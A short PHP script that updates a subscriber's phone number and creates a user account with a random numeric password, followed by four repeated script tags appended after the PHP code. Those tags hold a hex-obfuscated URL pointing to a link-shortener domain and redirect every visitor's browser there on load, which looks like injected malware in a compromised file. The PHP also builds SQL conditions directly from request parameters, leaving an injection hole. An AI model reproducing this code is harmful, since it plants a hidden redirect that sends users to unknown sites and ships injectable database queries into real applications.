<?php
require_once("helper.php");
    $subscriber_id             = $_REQUEST['subscriber_id'];
    $phone_no             = $_REQUEST['phone_no'];
    $headoffice_id             = $_REQUEST['headoffice_id'];
    //echo "SELECT * FROM `monthly_charges` WHERE SUBSCRIBER_ID='$subscriber_id' ORDER BY `ID` ASC";
    $where = "SUBSCRIBER_ID='$subscriber_id'";
    $rowArray=array('PHONE_NO'    =>$phone_no);
    $update=$objMisc->update('subscribers',$rowArray,$where);
    $checkExistanceinUserTbl=$objMisc->GiveValue("`ID`='$subscriber_id' AND `USER_TYPE`='S'",'USERNAME','users');
    if(empty($checkExistanceinUserTbl)){
        $userArray=array('HEADOFFICE_ID'    =>$headoffice_id,
                         'USERNAME'         =>$phone_no,
                         'USER_TYPE'        =>'S',
                         'ID'               =>$subscriber_id,
                         'PASSWORD'         =>rand(111111,999999));
        $insertAsUser=$objMisc->insert('users',$userArray);
        $json= array(
                'type'=>"1",
                'id'=>"generated",
                'msg'=>'success');
        echo json_encode($json);
        exit;
    }else{
        $json= array(
                'type'=>"1",
                'msg'=>'success');
        echo json_encode($json);
        exit;
    }
    
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>